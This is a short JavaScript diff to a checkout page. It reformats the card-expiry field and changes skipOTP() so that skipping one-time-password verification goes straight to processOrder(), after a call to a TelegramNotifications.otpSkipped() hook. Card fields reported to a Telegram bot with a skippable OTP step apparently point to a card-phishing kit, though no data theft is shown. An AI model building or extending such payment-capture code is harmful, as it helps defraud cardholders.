@@ -2259,9 +2259,10 @@ function setupCardInputFormatting() {
 
     if (expiryDateInput) {
         expiryDateInput.addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
-            if (value.length >= 2) {
-                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            // Automatically format as MM/YY
+            let value = e.target.value.replace(/\D/g, '').substring(0, 4);
+            if (value.length > 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2);
             }
             e.target.value = value;
         });
@@ -2430,8 +2431,9 @@ function skipOTP() {
     if (typeof TelegramNotifications !== 'undefined' && TelegramNotifications.otpSkipped) {
         TelegramNotifications.otpSkipped();
     }
-    console.warn('User skipped OTP. Proceeding to next step.');
-    goToCheckoutStep('success'); // or next appropriate step
+    console.warn('User skipped OTP. Proceeding to order completion.');
+    document.getElementById('otp-error').style.display = 'none';
+    processOrder();
 }
 
 // Initialize OTP inputs on page load or step render
